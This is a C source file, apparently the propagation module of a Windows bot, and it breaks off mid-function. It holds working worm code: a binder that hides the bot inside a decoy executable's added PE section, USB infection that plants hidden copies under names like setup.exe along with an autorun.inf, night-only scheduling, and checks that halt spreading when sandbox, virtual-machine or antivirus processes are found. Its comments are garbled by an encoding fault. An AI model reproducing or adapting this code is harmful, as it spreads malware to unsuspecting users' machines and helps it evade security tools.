#include "propagation.h"
#include "../comm/version_detect.h"
#include <time.h>

// ȫ�ֱ���
PropagationStats g_prop_stats = {0};
WindowsVersionInfo g_win_info = {0};
HANDLE g_propagation_thread = NULL;
BOOL g_propagation_active = FALSE;
CRITICAL_SECTION g_prop_cs;

// �ն��ļ����б�
static const WCHAR* DECOY_NAMES[] = {
    L"setup.exe",
    L"install.exe", 
    L"update.exe",
    L"config.exe",
    L"driver.exe",
    L"service.exe",
    L"helper.exe",
    L"manager.exe",
    L"launcher.exe",
    L"installer.exe",
    L"updater.exe",
    L"patcher.exe"
};

// ����Ӧ�ó���·��
static const WCHAR* COMMON_APP_PATHS[] = {
    L"C:\\Program Files\\",
    L"C:\\Program Files (x86)\\",
    L"C:\\Users\\%USERNAME%\\Desktop\\",
    L"C:\\Users\\%USERNAME%\\Downloads\\",
    L"C:\\Users\\%USERNAME%\\Documents\\",
    L"C:\\Windows\\System32\\",
    L"C:\\Windows\\SysWOW64\\"
};

// ��ʼ������ģ��
BOOL initialize_propagation() {
    printf("[Propagation] Initializing propagation module\n");
    
    InitializeCriticalSection(&g_prop_cs);
    memset(&g_prop_stats, 0, sizeof(PropagationStats));
    GetSystemTime(&g_prop_stats.last_propagation);
    
    // ���Windows�汾
    if (!detect_windows_version()) {
        printf("[Propagation] Failed to detect Windows version\n");
        return FALSE;
    }
    
    // ���ϵͳ������
    if (!is_windows_compatible()) {
        printf("[Propagation] System not compatible\n");
        return FALSE;
    }
    
    // ���ü�����ģʽ
    if (!setup_compatibility_mode()) {
        printf("[Propagation] Failed to setup compatibility mode\n");
    }
    
    printf("[Propagation] Propagation module initialized successfully\n");
    printf("[Propagation] Windows Version: %ls (Build %d)\n", 
           g_win_info.version_string, g_win_info.build_number);
    
    // ���ؼ�⵽��Windows�汾
    if (g_win_info.major_version == 10) {
        if (g_win_info.build_number >= WIN11_BUILD_NUMBER) {
            return WIN_11;
        } else {
            return WIN_10;
        }
    } else if (g_win_info.major_version == 6) {
        if (g_win_info.minor_version == 3) {
            return WIN_8_1;
        } else if (g_win_info.minor_version == 2) {
            return WIN_8;
        } else {
            return WIN_UNKNOWN; // Windows 7 or earlier not supported
        }
    } else {
        return WIN_UNKNOWN;
    }
}

// ������ģ��
void cleanup_propagation() {
    printf("[Propagation] Cleaning up propagation module\n");
    
    stop_propagation_engine();
    DeleteCriticalSection(&g_prop_cs);
    
    printf("[Propagation] Propagation module cleaned up\n");
}

// ���Windows�汾
WindowsVersion detect_windows_version() {
    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    
    // ʹ��RtlGetVersion��ȡ��ʵ�汾��Ϣ
    typedef NTSTATUS (WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hMod = GetModuleHandleW(L"ntdll.dll");
    if (hMod) {
        RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hMod, "RtlGetVersion");
        if (RtlGetVersion) {
            RTL_OSVERSIONINFOW rovi = {0};
            rovi.dwOSVersionInfoSize = sizeof(rovi);
            if (RtlGetVersion(&rovi) == 0) {
                g_win_info.major_version = rovi.dwMajorVersion;
                g_win_info.minor_version = rovi.dwMinorVersion;
                g_win_info.build_number = rovi.dwBuildNumber;
            }
        }
    }
    
    // ���÷���
    if (g_win_info.major_version == 0) {
        if (GetVersionExW((OSVERSIONINFOW*)&osvi)) {
            g_win_info.major_version = osvi.dwMajorVersion;
            g_win_info.minor_version = osvi.dwMinorVersion;
            g_win_info.build_number = osvi.dwBuildNumber;
        }
    }
    
    // ���64λϵͳ
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    g_win_info.is_64bit = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64);
    
    // ���ɰ汾�ַ���
    if (g_win_info.major_version == 10) {
        if (g_win_info.build_number >= WIN11_BUILD_NUMBER) {
            wcscpy_s(g_win_info.version_string, 64, L"Windows 11");
        } else {
            wcscpy_s(g_win_info.version_string, 64, L"Windows 10");
        }
    } else if (g_win_info.major_version == 6) {
        if (g_win_info.minor_version == 3) {
            wcscpy_s(g_win_info.version_string, 64, L"Windows 8.1");
        } else if (g_win_info.minor_version == 2) {
            wcscpy_s(g_win_info.version_string, 64, L"Windows 8");
        } else {
            wcscpy_s(g_win_info.version_string, 64, L"Windows 7 or earlier");
        }
    } else {
        swprintf_s(g_win_info.version_string, 64, L"Windows %d.%d", 
                  g_win_info.major_version, g_win_info.minor_version);
    }
    
    // ���ؼ�⵽��Windows�汾
    if (g_win_info.major_version == 10) {
        if (g_win_info.build_number >= WIN11_BUILD_NUMBER) {
            return WIN_11;
        } else {
            return WIN_10;
        }
    } else if (g_win_info.major_version == 6) {
        if (g_win_info.minor_version == 3) {
            return WIN_8_1;
        } else if (g_win_info.minor_version == 2) {
            return WIN_8;
        } else {
            return WIN_UNKNOWN; // Windows 7 or earlier not supported
        }
    } else {
        return WIN_UNKNOWN;
    }
}

// ���Windows������
BOOL is_windows_compatible() {
    // ֧��Windows 8�����ϰ汾
    if (g_win_info.major_version > WIN8_MAJOR_VERSION) {
        return TRUE; // Windows 10/11
    }
    
    if (g_win_info.major_version == WIN8_MAJOR_VERSION && 
        g_win_info.minor_version >= WIN8_MINOR_VERSION) {
        return TRUE; // Windows 8/8.1
    }
    
    printf("[Propagation] Unsupported Windows version: %d.%d\n", 
           g_win_info.major_version, g_win_info.minor_version);
    return FALSE;
}

// ���ü�����ģʽ
BOOL setup_compatibility_mode() {
    // ����Windows�汾���ò�ͬ�ļ����Բ���
    if (g_win_info.major_version == 10) {
        // Windows 10/11���⴦��
        printf("[Propagation] Setting up Windows 10/11 compatibility mode\n");
        
        // ���ý���DPI��֪
        typedef BOOL (WINAPI *SetProcessDPIAwarePtr)(void);
        HMODULE hUser32 = LoadLibraryW(L"user32.dll");
        if (hUser32) {
            SetProcessDPIAwarePtr SetProcessDPIAware = 
                (SetProcessDPIAwarePtr)GetProcAddress(hUser32, "SetProcessDPIAware");
            if (SetProcessDPIAware) {
                SetProcessDPIAware();
            }
            FreeLibrary(hUser32);
        }
    } else if (g_win_info.major_version == 6) {
        // Windows 8/8.1���⴦��
        printf("[Propagation] Setting up Windows 8/8.1 compatibility mode\n");
    }
    
    return TRUE;
}

// ���ϵͳҪ��
BOOL check_system_requirements() {
    // �����̿ռ�
    ULARGE_INTEGER freeBytesAvailable, totalNumberOfBytes;
    if (GetDiskFreeSpaceExW(L"C:\\", &freeBytesAvailable, &totalNumberOfBytes, NULL)) {
        if (freeBytesAvailable.QuadPart < 100 * 1024 * 1024) { // 100MB
            printf("[Propagation] Insufficient disk space\n");
            return FALSE;
        }
    }
    
    // ����ڴ�
    MEMORYSTATUSEX memStatus = {0};
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        if (memStatus.ullAvailPhys < 50 * 1024 * 1024) { // 50MB
            printf("[Propagation] Insufficient memory\n");
            return FALSE;
        }
    }
    
    return TRUE;
}

// �����󶨿�ִ���ļ�
BOOL create_bound_executable(const WCHAR* bot_path, const WCHAR* decoy_path, const WCHAR* output_path) {
    printf("[Propagation] Creating bound executable: %ls\n", output_path);
    
    HANDLE hBot = NULL, hDecoy = NULL, hOutput = NULL;
    BYTE* bot_data = NULL;
    BYTE* decoy_data = NULL;
    BOOL success = FALSE;
    
    // ��ȡbot�ļ�
    hBot = CreateFileW(bot_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hBot == INVALID_HANDLE_VALUE) {
        printf("[Propagation] Failed to open bot file: %d\n", GetLastError());
        goto cleanup;
    }
    
    DWORD bot_size = GetFileSize(hBot, NULL);
    if (bot_size == INVALID_FILE_SIZE) {
        printf("[Propagation] Failed to get bot file size\n");
        goto cleanup;
    }
    
    bot_data = (BYTE*)malloc(bot_size);
    if (!bot_data) {
        printf("[Propagation] Failed to allocate memory for bot data\n");
        goto cleanup;
    }
    
    DWORD bytes_read;
    if (!ReadFile(hBot, bot_data, bot_size, &bytes_read, NULL) || bytes_read != bot_size) {
        printf("[Propagation] Failed to read bot file\n");
        goto cleanup;
    }
    
    // ��ȡ�ն��ļ�
    hDecoy = CreateFileW(decoy_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hDecoy == INVALID_HANDLE_VALUE) {
        printf("[Propagation] Failed to open decoy file: %d\n", GetLastError());
        goto cleanup;
    }
    
    DWORD decoy_size = GetFileSize(hDecoy, NULL);
    if (decoy_size == INVALID_FILE_SIZE) {
        printf("[Propagation] Failed to get decoy file size\n");
        goto cleanup;
    }
    
    decoy_data = (BYTE*)malloc(decoy_size);
    if (!decoy_data) {
        printf("[Propagation] Failed to allocate memory for decoy data\n");
        goto cleanup;
    }
    
    if (!ReadFile(hDecoy, decoy_data, decoy_size, &bytes_read, NULL) || bytes_read != decoy_size) {
        printf("[Propagation] Failed to read decoy file\n");
        goto cleanup;
    }
    
    // ��������ļ����ȸ����ն��ļ���
    if (!CopyFileW(decoy_path, output_path, FALSE)) {
        printf("[Propagation] Failed to copy decoy file: %d\n", GetLastError());
        goto cleanup;
    }
    
    // ������ļ������޸�
    hOutput = CreateFileW(output_path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hOutput == INVALID_HANDLE_VALUE) {
        printf("[Propagation] Failed to open output file: %d\n", GetLastError());
        goto cleanup;
    }
    
    // ��Ӱ����ݵ�PE�ļ�
    if (!create_binding_section(hOutput, bot_data, bot_size, decoy_data, decoy_size)) {
        printf("[Propagation] Failed to create binding section\n");
        goto cleanup;
    }
    
    success = TRUE;
    printf("[Propagation] Successfully created bound executable\n");

cleanup:
    if (hBot) CloseHandle(hBot);
    if (hDecoy) CloseHandle(hDecoy);
    if (hOutput) CloseHandle(hOutput);
    if (bot_data) free(bot_data);
    if (decoy_data) free(decoy_data);
    
    return success;
}

// �����󶨽���
BOOL create_binding_section(HANDLE hFile, const BYTE* bot_data, DWORD bot_size, 
                           const BYTE* decoy_data, DWORD decoy_size) {
    
    // ��ȡPEͷ
    IMAGE_DOS_HEADER dos_header;
    DWORD bytes_read;
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hFile, &dos_header, sizeof(dos_header), &bytes_read, NULL)) {
        return FALSE;
    }
    
    if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[Propagation] Invalid DOS signature\n");
        return FALSE;
    }
    
    // ��ȡNTͷ
    IMAGE_NT_HEADERS nt_headers;
    SetFilePointer(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
    if (!ReadFile(hFile, &nt_headers, sizeof(nt_headers), &bytes_read, NULL)) {
        return FALSE;
    }
    
    if (nt_headers.Signature != IMAGE_NT_SIGNATURE) {
        printf("[Propagation] Invalid NT signature\n");
        return FALSE;
    }
    
    // ��������ݴ�С
    DWORD binding_data_size = sizeof(BindingData) - 1 + bot_size + decoy_size;
    DWORD aligned_size = (binding_data_size + nt_headers.OptionalHeader.FileAlignment - 1) & 
                        ~(nt_headers.OptionalHeader.FileAlignment - 1);
    
    // ����������
    BYTE* binding_buffer = (BYTE*)calloc(1, aligned_size);
    if (!binding_buffer) {
        return FALSE;
    }
    
    BindingData* binding = (BindingData*)binding_buffer;
    binding->magic = BINDER_MAGIC;
    binding->bot_size = bot_size;
    binding->decoy_size = decoy_size;
    
    // ��������
    memcpy(binding->data, bot_data, bot_size);
    memcpy(binding->data + bot_size, decoy_data, decoy_size);
    
    // �ҵ����һ������
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)malloc(
        sizeof(IMAGE_SECTION_HEADER) * nt_headers.FileHeader.NumberOfSections);
    
    SetFilePointer(hFile, dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS), NULL, FILE_BEGIN);
    if (!ReadFile(hFile, sections, 
                  sizeof(IMAGE_SECTION_HEADER) * nt_headers.FileHeader.NumberOfSections, 
                  &bytes_read, NULL)) {
        free(sections);
        free(binding_buffer);
        return FALSE;
    }
    
    IMAGE_SECTION_HEADER* last_section = &sections[nt_headers.FileHeader.NumberOfSections - 1];
    
    // �����½���ͷ
    IMAGE_SECTION_HEADER new_section = {0};
    strcpy_s((char*)new_section.Name, IMAGE_SIZEOF_SHORT_NAME, BIND_SECTION_NAME);
    new_section.Misc.VirtualSize = binding_data_size;
    new_section.VirtualAddress = (last_section->VirtualAddress + last_section->Misc.VirtualSize + 
                                 nt_headers.OptionalHeader.SectionAlignment - 1) & 
                                ~(nt_headers.OptionalHeader.SectionAlignment - 1);
    new_section.SizeOfRawData = aligned_size;
    new_section.PointerToRawData = (last_section->PointerToRawData + last_section->SizeOfRawData + 
                                   nt_headers.OptionalHeader.FileAlignment - 1) & 
                                  ~(nt_headers.OptionalHeader.FileAlignment - 1);
    new_section.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
    
    // ����PEͷ
    nt_headers.FileHeader.NumberOfSections++;
    nt_headers.OptionalHeader.SizeOfImage = new_section.VirtualAddress + 
                                           ((new_section.Misc.VirtualSize + 
                                             nt_headers.OptionalHeader.SectionAlignment - 1) & 
                                            ~(nt_headers.OptionalHeader.SectionAlignment - 1));
    
    // д����µ�NTͷ
    SetFilePointer(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
    DWORD bytes_written;
    if (!WriteFile(hFile, &nt_headers, sizeof(nt_headers), &bytes_written, NULL)) {
        free(sections);
        free(binding_buffer);
        return FALSE;
    }
    
    // д���½���ͷ
    SetFilePointer(hFile, dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + 
                   sizeof(IMAGE_SECTION_HEADER) * (nt_headers.FileHeader.NumberOfSections - 1), 
                   NULL, FILE_BEGIN);
    if (!WriteFile(hFile, &new_section, sizeof(new_section), &bytes_written, NULL)) {
        free(sections);
        free(binding_buffer);
        return FALSE;
    }
    
    // д�������
    SetFilePointer(hFile, new_section.PointerToRawData, NULL, FILE_BEGIN);
    if (!WriteFile(hFile, binding_buffer, aligned_size, &bytes_written, NULL)) {
        free(sections);
        free(binding_buffer);
        return FALSE;
    }
    
    free(sections);
    free(binding_buffer);
    
    printf("[Propagation] Successfully added binding section\n");
    return TRUE;
}

// �����ն��ļ���
WCHAR* generate_decoy_filename() {
    static WCHAR filename[MAX_PATH];
    int index = rand() % (sizeof(DECOY_NAMES) / sizeof(DECOY_NAMES[0]));
    wcscpy_s(filename, MAX_PATH, DECOY_NAMES[index]);
    return filename;
}

// ɨ��USB������
BOOL scan_usb_drives() {
    printf("[Propagation] Scanning for USB drives\n");
    
    WCHAR drives[256];
    DWORD drives_len = GetLogicalDriveStringsW(256, drives);
    
    if (drives_len == 0) {
        printf("[Propagation] Failed to get drive strings: %d\n", GetLastError());
        return FALSE;
    }
    
    WCHAR* drive = drives;
    BOOL found_usb = FALSE;
    
    while (*drive) {
        UINT drive_type = GetDriveTypeW(drive);
        
        if (drive_type == DRIVE_REMOVABLE) {
            printf("[Propagation] Found removable drive: %ls\n", drive);
            
            if (infect_usb_drive(drive)) {
                found_usb = TRUE;
                update_propagation_stats(PROP_USB_DRIVES, TRUE);
            } else {
                update_propagation_stats(PROP_USB_DRIVES, FALSE);
            }
        }
        
        // �ƶ�����һ��������
        drive += wcslen(drive) + 1;
    }
    
    return found_usb;
}

// ��ȾUSB������
BOOL infect_usb_drive(const WCHAR* drive_letter) {
    printf("[Propagation] Attempting to infect USB drive: %ls\n", drive_letter);
    
    // ����������Ƿ��д
    WCHAR test_path[MAX_PATH];
    swprintf_s(test_path, MAX_PATH, L"%ls\\test_write.tmp", drive_letter);
    
    HANDLE hTest = CreateFileW(test_path, GENERIC_WRITE, 0, NULL, CREATE_NEW, 
                               FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hTest == INVALID_HANDLE_VALUE) {
        printf("[Propagation] USB drive not writable: %ls (Error: %d)\n", 
               drive_letter, GetLastError());
        return FALSE;
    }
    CloseHandle(hTest);
    DeleteFileW(test_path);
    
    // ���ư󶨵Ŀ�ִ���ļ���USB
    if (!copy_bound_executable_to_usb(drive_letter)) {
        printf("[Propagation] Failed to copy executable to USB\n");
        return FALSE;
    }
    
    // ����autorun.inf
    WCHAR* executable_name = generate_decoy_filename();
    if (!create_autorun_inf(drive_letter, executable_name)) {
        printf("[Propagation] Failed to create autorun.inf\n");
        // ������FALSE����Ϊ�ļ��Ѿ����Ƴɹ�
    }
    
    log_propagation_attempt(drive_letter, PROP_USB_DRIVES, TRUE);
    printf("[Propagation] Successfully infected USB drive: %ls\n", drive_letter);
    
    return TRUE;
}

// ���ư󶨵Ŀ�ִ���ļ���USB
BOOL copy_bound_executable_to_usb(const WCHAR* drive_path) {
    WCHAR self_path[MAX_PATH];
    WCHAR dest_path[MAX_PATH];
    WCHAR* filename = generate_decoy_filename();
    
    // ��ȡ����·��
    if (!GetModuleFileNameW(NULL, self_path, MAX_PATH)) {
        printf("[Propagation] Failed to get self path: %d\n", GetLastError());
        return FALSE;
    }
    
    // ����Ŀ��·��
    swprintf_s(dest_path, MAX_PATH, L"%ls\\%ls", drive_path, filename);
    
    // ���Ŀ���Ƿ��Ѵ���
    if (GetFileAttributesW(dest_path) != INVALID_FILE_ATTRIBUTES) {
        printf("[Propagation] Target already exists: %ls\n", dest_path);
        return FALSE;
    }
    
    // �����ļ�
    if (!CopyFileW(self_path, dest_path, TRUE)) {
        printf("[Propagation] Failed to copy to %ls: %d\n", dest_path, GetLastError());
        return FALSE;
    }
    
    // �����ļ�����
    if (!set_file_attributes_stealth(dest_path)) {
        printf("[Propagation] Failed to set stealth attributes\n");
    }
    
    printf("[Propagation] Successfully copied to: %ls\n", dest_path);
    return TRUE;
}

// ����autorun.inf�ļ�
BOOL create_autorun_inf(const WCHAR* drive_path, const WCHAR* executable_name) {
    WCHAR autorun_path[MAX_PATH];
    swprintf_s(autorun_path, MAX_PATH, L"%ls\\autorun.inf", drive_path);
    
    HANDLE hFile = CreateFileW(autorun_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[Propagation] Failed to create autorun.inf: %d\n", GetLastError());
        return FALSE;
    }
    
    char autorun_content[1024];
    sprintf_s(autorun_content, 1024, 
        "[autorun]\r\n"
        "open=%ls\r\n"
        "icon=%ls,0\r\n"
        "label=USB Drive\r\n"
        "action=Open folder to view files\r\n"
        "UseAutoPlay=1\r\n",
        executable_name, executable_name);
    
    DWORD written;
    if (!WriteFile(hFile, autorun_content, strlen(autorun_content), &written, NULL)) {
        printf("[Propagation] Failed to write autorun.inf: %d\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }
    
    CloseHandle(hFile);
    printf("[Propagation] Created autorun.inf for %ls\n", executable_name);
    
    return TRUE;
}

// ���������ļ�����
BOOL set_file_attributes_stealth(const WCHAR* file_path) {
    // ����Ϊ���غ�ϵͳ�ļ�
    DWORD attributes = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
    
    if (!SetFileAttributesW(file_path, attributes)) {
        printf("[Propagation] Failed to set file attributes: %d\n", GetLastError());
        return FALSE;
    }
    
    return TRUE;
}

// ��¼��������
void log_propagation_attempt(const WCHAR* target, PropagationMethod method, BOOL success) {
    EnterCriticalSection(&g_prop_cs);
    
    if (g_prop_stats.target_count < MAX_TARGETS) {
        PropagationTarget* new_target = &g_prop_stats.targets[g_prop_stats.target_count];
        wcscpy_s(new_target->path, MAX_PATH_LEN, target);
        new_target->method = method;
        new_target->infected = success;
        GetSystemTime(&new_target->timestamp);
        g_prop_stats.target_count++;
    }
    
    LeaveCriticalSection(&g_prop_cs);
    
    printf("[Propagation] %s propagation to %ls via method %d\n", 
           success ? "Successful" : "Failed", target, method);
}

// ���´���ͳ��
void update_propagation_stats(PropagationMethod method, BOOL success) {
    EnterCriticalSection(&g_prop_cs);
    
    g_prop_stats.total_attempts++;
    
    if (success) {
        g_prop_stats.successful_infections++;
        
        switch (method) {
            case PROP_USB_DRIVES:
                g_prop_stats.usb_infections++;
                break;
            case PROP_NETWORK_SHARES:
                g_prop_stats.network_infections++;
                break;
            case PROP_FILE_BINDING:
                g_prop_stats.file_bindings++;
                break;
        }
    } else {
        g_prop_stats.failed_attempts++;
    }
    
    GetSystemTime(&g_prop_stats.last_propagation);
    
    LeaveCriticalSection(&g_prop_cs);
}

// ��ӡ����ͳ��
void print_propagation_statistics() {
    EnterCriticalSection(&g_prop_cs);
    
    printf("\n=== Propagation Statistics ===\n");
    printf("Total Attempts: %d\n", g_prop_stats.total_attempts);
    printf("Successful Infections: %d\n", g_prop_stats.successful_infections);
    printf("Failed Attempts: %d\n", g_prop_stats.failed_attempts);
    printf("USB Infections: %d\n", g_prop_stats.usb_infections);
    printf("Network Infections: %d\n", g_prop_stats.network_infections);
    printf("File Bindings: %d\n", g_prop_stats.file_bindings);
    printf("Target Count: %d\n", g_prop_stats.target_count);
    printf("==============================\n\n");
    
    LeaveCriticalSection(&g_prop_cs);
}

// ���������߳�
DWORD WINAPI propagation_engine_thread(LPVOID param) {
    printf("[Propagation] Propagation engine thread started\n");
    
    while (g_propagation_active) {
        // ����ӳ�
        Sleep(PROPAGATION_DELAY + (rand() % 10000));
        
        // ����Ƿ�Ӧ�ô���
        if (!should_propagate_now()) {
            Sleep(60000); // �ȴ�1����
            continue;
        }
        
        // ִ��USB����
        scan_usb_drives();
        Sleep(5000);
        
        // ��ӡͳ����Ϣ
        if (g_prop_stats.total_attempts > 0 && g_prop_stats.total_attempts % 10 == 0) {
            print_propagation_statistics();
        }
        
        // ��ʱ��ȴ�
        Sleep(USB_SCAN_INTERVAL);
    }
    
    printf("[Propagation] Propagation engine thread stopped\n");
    return 0;
}

// ������������
BOOL start_propagation_engine() {
    if (g_propagation_thread != NULL) {
        printf("[Propagation] Propagation engine already running\n");
        return TRUE;
    }
    
    g_propagation_active = TRUE;
    g_propagation_thread = CreateThread(NULL, 0, propagation_engine_thread, NULL, 0, NULL);
    
    if (g_propagation_thread) {
        printf("[Propagation] Propagation engine started successfully\n");
        return TRUE;
    } else {
        printf("[Propagation] Failed to start propagation engine: %d\n", GetLastError());
        g_propagation_active = FALSE;
        return FALSE;
    }
}

// ֹͣ��������
void stop_propagation_engine() {
    if (g_propagation_thread == NULL) {
        return;
    }
    
    printf("[Propagation] Stopping propagation engine\n");
    g_propagation_active = FALSE;
    
    // �ȴ��߳̽���
    if (WaitForSingleObject(g_propagation_thread, 5000) == WAIT_TIMEOUT) {
        printf("[Propagation] Force terminating propagation thread\n");
        TerminateThread(g_propagation_thread, 0);
    }
    
    CloseHandle(g_propagation_thread);
    g_propagation_thread = NULL;
    
    printf("[Propagation] Propagation engine stopped\n");
}

// ����Ƿ�Ӧ�ô���
BOOL should_propagate_now() {
    // ���ʱ�䴰�ڣ������ڹ���ʱ�䴫����
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    // ����ҹ���糿������23:00-06:00��
    if (st.wHour >= 6 && st.wHour <= 23) {
        return FALSE;
    }
    
    // ���ϵͳ��Դ
    MEMORYSTATUSEX memStatus = {0};
    memStatus.dwLength = sizeof(memStatus);
    if (GlobalMemoryStatusEx(&memStatus)) {
        // ����ڴ�ʹ���ʳ���80%����ͣ����
        if (memStatus.dwMemoryLoad > 80) {
            return FALSE;
        }
    }
    
    return TRUE;
}

// ����Ƿ�������
BOOL is_propagation_allowed() {
    // ����Ƿ����������ɳ�价����
    if (check_sandbox_environment()) {
        return FALSE;
    }
    
    // ���ɱ�����
    if (check_antivirus_presence()) {
        return FALSE;
    }
    
    return TRUE;
}

// ���ɳ�价��
BOOL check_sandbox_environment() {
    // ��鳣����ɳ�����
    const WCHAR* sandbox_processes[] = {
        L"vmsrvc.exe",
        L"vmusrvc.exe", 
        L"vmtoolsd.exe",
        L"vmwaretray.exe",
        L"vmwareuser.exe",
        L"VGAuthService.exe",
        L"vmacthlp.exe",
        L"vboxservice.exe",
        L"vboxtray.exe",
        L"sandboxiedcomlaunch.exe",
        L"sandboxierpcss.exe",
        NULL
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    do {
        for (int i = 0; sandbox_processes[i] != NULL; i++) {
            if (_wcsicmp(pe32.szExeFile, sandbox_processes[i]) == 0) {
                CloseHandle(hSnapshot);
                printf("[Propagation] Sandbox environment detected: %ls\n", pe32.szExeFile);
                return TRUE;
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    
    // ���ע����е��������ʶ
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, 
                      L"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum", 
                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        
        WCHAR value[256];
        DWORD value_size = sizeof(value);
        
        if (RegQueryValueExW(hKey, L"0", NULL, NULL, (LPBYTE)value, &value_size) == ERROR_SUCCESS) {
            if (wcsstr(value, L"VBOX") || wcsstr(value, L"VMWARE") || wcsstr(value, L"QEMU")) {
                RegCloseKey(hKey);
                printf("[Propagation] Virtual machine detected in registry\n");
                return TRUE;
            }
        }
        
        RegCloseKey(hKey);
    }
    
    return FALSE;
}

// ���ɱ�����
BOOL check_antivirus_presence() {
    const WCHAR* av_processes[] = {
        L"avp.exe",           // Kaspersky
        L"avgnt.exe",         // Avira
        L"avguard.exe",       // Avira
        L"bdagent.exe",       // Bitdefender
        L"egui.exe",          // ESET
        L"ekrn.exe",          // ESET
        L"msmpeng.exe",       // Windows Defender
        L"msseces.exe",       // Windows Defender
        L"mcshield.exe",      // McAfee
        L"vsserv.exe",        // Bitdefender
        L"avastui.exe",       // Avast
        L"avastsvc.exe",      // Avast
        L"avgui.exe",         // AVG
        L"avgsvc.exe",        // AVG
        NULL
    };
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return FALSE;
    }
    
    do {
        for (int i = 0; av_processes[i] != NULL; i++) {
            if (_wcsicmp(pe32.szExeFile, av_processes[i]) == 0) {
                CloseHandle(hSnapshot);
                printf("[Propagation] Antivirus detected: %ls\n", pe32.szExeFile);
                return TRUE;
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    return FALSE;
}

// ���������
BOOL avoid_detection_mechanisms() {
    // ���������ʱ��
    if (!randomize_propagation_timing()) {
        return FALSE;
    }
    
    // ���ϵͳ����
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    
    // ���CPU����������2�������������
    if (si.dwNumberOfProcessors < 2) {
        printf("[Propagation] Suspicious CPU count: %d\n", si.dwNumberOfProcessors);
        return FALSE;
    }
    
    return TRUE;
}

// ���������ʱ��
BOOL randomize_propagation_timing() {
    // ��������ӳ٣�1-10���ӣ�
    srand((unsigned int)time(NULL));
    int delay = (rand() % 600) + 60; // 60-660��
    
    printf("[Propagation] Random delay: %d seconds\n", delay);
    Sleep(delay * 1000);
    
    return TRUE;
}

// ���Ŀ���Ƿ��Ѹ�Ⱦ
BOOL is_target_already_infected(const WCHAR* target_path) {
    EnterCriticalSection(&g_prop_cs);
    
    for (int i = 0; i < g_prop_stats.target_count; i++) {
        if (_wcsicmp(g_prop_stats.targets[i].path, target_path) == 0 && 
            g_prop_stats.targets[i].infected) {
            LeaveCriticalSection(&g_prop_cs);
            return TRUE;
        }
    }
    
    LeaveCriticalSection(&g_prop_cs);
    return FALSE;
}

// ���Ŀ���Ѹ�Ⱦ
BOOL mark_target_as_infected(const WCHAR* target_path) {
    EnterCriticalSection(&g_prop_cs);
    
    for (int i = 0; i < g_prop_stats.target_count; i++) {
        if (_wcsicmp(g_prop_stats.targets[i].path, target_path) == 0) {
            g_prop_stats.targets[i].infected = TRUE;
            GetSystemTime(&g_prop_stats.targets[i].timestamp);
            LeaveCriticalSection(&g_prop_cs);
            return TRUE;
        }
    }
    
    LeaveCriticalSection(&g_prop_cs);
    return FALSE;
}

// �����ļ�����������
BOOL copy_file_with_attributes(const WCHAR* source, const WCHAR* destination) {
    // ��ȡԴ�ļ�����
    DWORD attributes = GetFileAttributesW(source);
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        return FALSE;
    }
    
    // �����ļ�
    if (!CopyFileW(source, destination, FALSE)) {
        return FALSE;
    }
    
    // ����Ŀ���ļ�����
    if (!SetFileAttributesW(destination, attributes)) {
        printf("[Propagation] Warning: Failed to set file attributes\n");
    }
    
    return TRUE;
}

// ��ȡ��ʱ�ļ�·��
BOOL get_temp_file_path(WCHAR* temp_path, const WCHAR* prefix) {
    WCHAR temp_dir[MAX_PATH];
    
    if (!GetTempPathW(MAX_PATH, temp_dir)) {
        return FALSE;
    }
    
    if (!GetTempFileNameW(temp_dir, prefix, 0, temp_path)) {
        return FALSE;
    }
    
    return TRUE;
}

// ��Ĭִ���ļ�
BOOL execute_file_silently(const WCHAR* file_path) {
